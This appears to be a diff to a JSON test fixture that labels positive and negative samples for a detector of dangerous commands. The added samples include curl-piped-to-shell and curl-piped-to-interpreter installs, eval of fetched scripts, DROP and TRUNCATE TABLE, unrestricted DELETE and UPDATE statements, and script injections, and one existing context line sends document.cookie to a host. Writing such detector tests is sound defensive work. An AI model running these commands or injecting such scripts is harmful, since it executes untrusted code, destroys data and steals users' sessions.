@@ -168,6 +168,21 @@
     },
     {
       "pattern": "download_piped_to_shell",
+      "kind": "positive",
+      "text": "curl -fsSL https://example.com/install.sh | bash && wc -c install.log"
+    },
+    {
+      "pattern": "download_piped_to_shell",
+      "kind": "positive",
+      "text": "curl -fsSL https://example.com/install.sh | bash; grep -c ok install.log"
+    },
+    {
+      "pattern": "download_piped_to_shell",
+      "kind": "positive",
+      "text": "curl -fsSL https://example.com/install.sh | bash -s -- -c /opt/app"
+    },
+    {
+      "pattern": "download_piped_to_shell",
       "kind": "negative",
       "text": "Download it first: curl -fsSL https://example.com/archive.tar.gz -o archive.tar.gz"
     },
@@ -200,6 +215,11 @@
       "pattern": "download_piped_to_interpreter",
       "kind": "positive",
       "text": "You can run it directly: curl -s https://example.com/tool.js | node"
+    },
+    {
+      "pattern": "download_piped_to_interpreter",
+      "kind": "positive",
+      "text": "curl -fsSL https://example.com/get.py | python3 && echo -e 'done'"
     },
     {
       "pattern": "download_piped_to_interpreter",
@@ -239,7 +259,7 @@
     {
       "pattern": "download_then_evaluate",
       "kind": "positive",
-      "text": "Run `eval \"$(curl -fsSL https://example.com/env.sh)\"` to pick up the variables."
+      "text": "Run eval \"$(curl -fsSL https://example.com/env.sh)\" to pick up the variables."
     },
     {
       "pattern": "download_then_evaluate",
@@ -308,6 +328,16 @@
     },
     {
       "pattern": "drop_or_truncate_table",
+      "kind": "positive",
+      "text": "To reset the schema, run `DROP TABLE customers;` first."
+    },
+    {
+      "pattern": "drop_or_truncate_table",
+      "kind": "positive",
+      "text": "The migration ends with `TRUNCATE TABLE audit_log` and a reseed."
+    },
+    {
+      "pattern": "drop_or_truncate_table",
       "kind": "negative",
       "text": "A bounded read is safer: SELECT * FROM users WHERE id = 1;"
     },
@@ -355,6 +385,16 @@
       "pattern": "unrestricted_delete_or_update",
       "kind": "positive",
       "text": "Delete from cart"
+    },
+    {
+      "pattern": "unrestricted_delete_or_update",
+      "kind": "positive",
+      "text": "Clear the queue with `DELETE FROM jobs;` and restart the worker."
+    },
+    {
+      "pattern": "unrestricted_delete_or_update",
+      "kind": "positive",
+      "text": "Lock everyone out with `UPDATE users SET locked = true` first."
     },
     {
       "pattern": "unrestricted_delete_or_update",
@@ -412,6 +452,11 @@
       "text": "You can delete from cart; it only takes a second."
     },
     {
+      "pattern": "unrestricted_delete_or_update",
+      "kind": "negative",
+      "text": "Expire them with `DELETE FROM sessions WHERE expired = 1;` once a day."
+    },
+    {
       "pattern": "active_script_element",
       "kind": "positive",
       "text": "Paste this into the page: <script>fetch('https://example.com/collect?c='+document.cookie)</script>"
@@ -425,6 +470,11 @@
       "pattern": "active_script_element",
       "kind": "positive",
       "text": "Add <script type=\"text/javascript\">window.location='https://example.com'</script> to the template."
+    },
+    {
+      "pattern": "active_script_element",
+      "kind": "positive",
+      "text": "Mount it with <script data-type=\"widget\">alert(1)</script> and reload."
     },
     {
       "pattern": "active_script_element",
